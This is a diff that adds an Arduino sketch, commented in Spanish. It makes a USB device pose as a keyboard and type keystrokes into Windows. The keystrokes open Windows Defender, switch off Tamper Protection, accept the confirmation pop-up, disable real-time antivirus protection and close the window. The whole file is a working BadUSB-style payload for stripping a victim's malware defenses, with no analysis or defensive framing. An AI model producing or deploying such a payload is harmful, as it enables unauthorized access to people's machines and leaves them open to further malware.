@@ -1,0 +1,122 @@
+#include "HID-Project.h"
+void setup() {
+  // put your setup code here, to run once:
+  Keyboard.begin();
+  delay(500);
+
+ //abre Windows Defender 
+  Keyboard.press(KEY_LEFT_GUI);
+  delay(500);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.print("defender");
+  delay(500);
+  Keyboard.press(KEY_ENTER);
+  Keyboard.releaseAll();
+  delay(3500);
+  
+//Ingresa a Proteccion antivirus y contra amenazas
+  Keyboard.press(KEY_ENTER);
+  Keyboard.releaseAll();
+  delay(1000);
+
+//Ingresa a Administrar la configuracion
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_ENTER);
+  Keyboard.releaseAll();
+  delay(2000);
+  
+//Desactiva Tamper Protection
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_SPACE);
+  Keyboard.releaseAll();
+  delay(2000);
+  
+  //Ejecutar el pop up
+  Keyboard.press(KEY_LEFT_ARROW);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_ENTER);
+  Keyboard.releaseAll();
+  delay(1500);
+
+  //Detener antivirus
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_SPACE);
+  Keyboard.releaseAll();
+  delay(500);
+
+  //Cerrar Windows Defender
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  Keyboard.releaseAll();
+  delay(500);
+}
+
+void loop() {
+  // put your main code here, to run repeatedly:
+
+}
